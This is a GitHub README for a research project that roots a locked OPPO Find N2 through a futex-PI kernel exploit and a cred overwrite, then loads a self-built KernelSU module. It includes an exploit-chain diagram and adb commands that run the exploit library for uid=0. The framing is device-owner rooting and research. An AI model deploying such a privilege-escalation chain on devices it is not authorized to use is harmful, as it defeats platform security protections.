<div align="center">

# oppofindN2-ghostlock

**KernelSU late-load on a locked OPPO Find N2 — full chain, self-built LKM, no unlocked bootloader.**

`futex-PI write primitive → cred overwrite → ADRP overflow fixed → kernelsu.ko live`

![root](https://img.shields.io/badge/root-achieved-brightgreen)
![KMI](https://img.shields.io/badge/KMI-android12--5.10-blue)
![SoC](https://img.shields.io/badge/SoC-SM8475-orange)
![SELinux](https://img.shields.io/badge/SELinux-Enforcing-success)

</div>

---

## ✨ What is this

A complete, working research chain that loads a self-compiled KernelSU kernel module into a
**stock, OTA-locked OPPO Find N2 (PGU110 / SM8475)** — ending with
`su -c id → uid=0 … context=u:r:ksu:s0` while SELinux stays **Enforcing**.

Everything in `lkm-build/` (the loader, the symbol-wall shim, the build system) is **original
work from this repo**; the userland exploit is a GPL-3.0 port of the matisse framework adapted
to this device (see [NOTICE](exploit-v29/NOTICE.md)).

## 🏗️ How it works

```
 ① futex PI requeue race      →  kernel write primitive  (GhostLock, CVE-2026-43499)
 ② task->cred = &init_cred    →  CapEff 0000000000000000 → 000001ffffffffff
 ③ gate check                 →  capable() ✓ SELinux ✓ domain ✓  (the wall was never here)
 ④ finit_module               →  R_AARCH64_ADR_PREL_PG_HI21 overflow  ← the real wall
                                fixed by -mcmodel=large: reloc-275 1497 → 0
 ⑤ kernelsu.ko live           →  /system/bin/su · u:r:ksu:s0 · SELinux Enforcing
```

## 📊 Results

| | |
|---|---|
| **Write primitive** | `CapEff: 000001ffffffffff` observed on-device (3/3 runs) |
| **Relocation fix** | type-275 count **1497 → 0** (ELF `.rela` histogram verified) |
| **Symbol wall** | TRIM_UNUSED_KSYMS cut 49 symbols → kprobe bootstrap + forward defs → **0 undefined** |
| **SCM gate** | `scmversion` pinned to `g74d132f4467a`, byte-exact |
| **Stability** | preflight gate + reduced-pressure recipe; final uptime **27h+ zero crash** |

## 🚀 Quick start

<details>
<summary><b>Build & run</b> (click to expand)</summary>

```bash
# 1) kernel modules are built by GitHub Actions (build-lkm.yml) — download artifacts,
#    or build locally:
KSRC=<vendor-tree> KSU=<KernelSU> CLANG=<clang12> CONFIG=config-5.10.236 \
    bash lkm-build/build-lkm.sh

# 2) stage-A write primitive (userland)
adb push exploit-v29/build/oppo-find_n2/bin/preload.so /data/local/tmp/preload29.so
adb shell "LD_PRELOAD=/data/local/tmp/preload29.so /system/bin/toybox id"   # uid=0

# 3) stage-B late-load
adb push lkm-build/out/ksu_min_load.ko lkm-build/out/kernelsu.ko /data/local/tmp/

# 4) verify
adb shell "su -c id"                     # uid=0 … context=u:r:ksu:s0
adb shell "grep kernelsu /proc/modules"  # kernelsu … Live
```

</details>

## 📁 Repository map

```
exploit-v29/     userland exploit (matisse port, GPL-3.0) + Find-N2 offsets
lkm-build/       ★ original build system: loader · symbol shim · CI scripts
analysis-scripts/  ELF / symbol / offset tooling
test-programs/   standalone PoC probes (C sources only)
docs/            research notes · evidence logs · handoff snapshots
RESEARCH.md      ★ full technical write-up (§1–§10)
```

## 📜 The full story

Every dead end, dmesg line and fix is documented in **[RESEARCH.md](RESEARCH.md)** —
including why the permission gate was never the problem, how the ADRP overflow was found
and killed, and what changed after the 5.10.246 OTA.

## 🙏 Credits

- **NebuSec/CyberMeowfia** — GhostLock (CVE-2026-43499) research & exploit framework
- **ihamn/matisse-public** (GPL-3.0) — upstream of `exploit-v29/`
- **Dere3046/ElevateMe** — rb_erase cred-overwrite mechanism
- **JoinChang/ghostlock-oneplus** — same-SoC offset cross-validation
- **DirtyFrag / DFRoot community (CVE-2026-43284)** — *ideas* only (page-cache clean-up,
  DEFEX stubs, STATIC_USERMODEHELPER bypass); **no code** was taken — `lkm-build/minload/`
  is an original implementation, comparison in [RESEARCH.md §8](RESEARCH.md)
- lspromise & kanxue community discussions

## ⚖️ License & disclaimer

- `lkm-build/`, docs, scripts: **GPL-2.0-only** · `exploit-v29/`: **GPL-3.0** (upstream)
- Research/education only, on your own device, at your own risk. Bricking, data loss and
  warranty loss are real possibilities. No OPPO proprietary firmware is included in this repo.
